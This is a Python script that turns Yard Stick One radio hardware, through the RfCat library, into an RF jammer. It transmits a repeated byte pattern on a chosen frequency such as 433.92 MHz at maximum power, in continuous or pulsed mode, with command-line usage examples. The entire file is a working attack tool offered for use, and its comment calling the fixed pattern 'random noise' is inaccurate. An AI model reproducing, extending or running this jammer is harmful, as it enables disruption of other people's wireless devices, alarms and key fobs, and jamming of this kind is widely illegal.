import sys
import time
import argparse
from rflib import *

# -------------------------------------------
# Yard Stick One Jamming Script
# -------------------------------------------
# Features:
# - Transmits continuous noise to disrupt RF communications.
# - Can be fine-tuned for targeted jamming instead of broadband disruption.
# - Supports configurable frequency and power settings.
#
# Requirements:
# - Yard Stick One (YardStickOne) hardware
# - RfCat Python library
# - Python 3.x
#
# Usage:
# python yardstick_jammer.py --freq 433920000 --power 10 --mode continuous
# python yardstick_jammer.py --freq 433920000 --power 10 --mode pulse --interval 0.5
# -------------------------------------------

def configure_device(d, frequency, power):
    """Configures the Yard Stick One device for jamming."""
    d.setModeTX()
    d.setFreq(frequency)
    d.setMaxPower() if power == 10 else d.setPower(power)
    d.setMdmModulation(MOD_ASK_OOK)  # Default to OOK for noise generation
    d.setMdmDRate(4800)  # Default baud rate
    print(f"[*] Configured: Frequency {frequency / 1e6} MHz, Power {power}")

def continuous_jamming(d):
    """Transmits continuous noise to jam RF signals."""
    print("[+] Starting continuous jamming...")
    noise = b'\xAA' * 128  # Random noise pattern
    try:
        while True:
            d.RFxmit(noise)
    except KeyboardInterrupt:
        print("\n[!] Stopping jamming...")

def pulse_jamming(d, interval):
    """Transmits noise in pulses to jam RF signals intermittently."""
    print(f"[+] Starting pulse jamming with interval {interval} seconds...")
    noise = b'\xAA' * 128
    try:
        while True:
            d.RFxmit(noise)
            time.sleep(interval)
    except KeyboardInterrupt:
        print("\n[!] Stopping jamming...")

def main():
    parser = argparse.ArgumentParser(description="Yard Stick One Jamming Script")
    parser.add_argument("--freq", type=int, required=True, help="Jamming frequency in Hz")
    parser.add_argument("--power", type=int, default=10, help="Transmission power level (default: 10)")
    parser.add_argument("--mode", type=str, choices=["continuous", "pulse"], required=True, help="Jamming mode: continuous or pulse")
    parser.add_argument("--interval", type=float, default=1.0, help="Interval for pulse jamming (default: 1s)")
    args = parser.parse_args()

    try:
        d = RfCat()
        configure_device(d, args.freq, args.power)
        
        if args.mode == "continuous":
            continuous_jamming(d)
        elif args.mode == "pulse":
            pulse_jamming(d, args.interval)
    except Exception as e:
        print(f"[!] Error: {e}")
    finally:
        d.setModeIDLE()
        d.cleanup()

if __name__ == "__main__":
    main()
